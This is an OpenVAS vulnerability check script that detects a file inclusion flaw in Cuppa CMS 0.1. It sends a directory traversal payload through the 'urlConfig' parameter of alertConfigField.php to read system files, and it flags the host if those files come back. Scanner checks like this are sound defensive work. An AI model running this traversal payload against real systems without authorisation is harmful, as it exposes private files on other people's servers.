###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_cuppa_cms_file_inclusion_vuln.nasl 11401 2018-09-15 08:45:50Z cfischer $
#
# Cuppa CMS Remote/Local File Inclusion Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803805");
  script_version("$Revision: 11401 $");
  script_tag(name:"cvss_base", value:"7.6");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:H/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-09-15 10:45:50 +0200 (Sat, 15 Sep 2018) $");
  script_tag(name:"creation_date", value:"2013-06-06 10:36:14 +0530 (Thu, 06 Jun 2013)");
  script_name("Cuppa CMS Remote/Local File Inclusion Vulnerability");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/25971");
  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/121881/cuppacms-rfi.txt");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_dependencies("find_service.nasl", "http_version.nasl", "os_detection.nasl");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to read
  or include arbitrary files from the local system using directory traversal
  sequences on the target system.");
  script_tag(name:"affected", value:"Cuppa CMS beta version 0.1");
  script_tag(name:"insight", value:"Improper sanitation of user supplied input via 'urlConfig'
  parameter to 'alerts/alertConfigField.php' script.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is installed with Cuppa CMS and is prone to file
  inclusion vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

port = get_http_port(default:80);

if(!can_host_php(port:port)){
  exit(0);
}

files = traversal_files();

foreach dir (make_list_unique("/", "/cuppa", "/cms", cgi_dirs(port:port)))
{

  if( dir == "/" ) dir = "";

  rcvRes = http_get_cache(item: dir + "/index.php", port:port);

  if(rcvRes && ">Cuppa CMS" >< rcvRes && "Username<" >< rcvRes)
  {

    foreach file (keys(files))
    {
      url = dir + "/alerts/alertConfigField.php?urlConfig=" +
                  crap(data:"../",length:3*15) + files[file];

      if(http_vuln_check(port:port, url:url, pattern:file))
      {
        report = report_vuln_url( port:port, url:url );
        security_message(port:port, data:report);
        exit(0);
      }
    }
  }
}

exit(99);
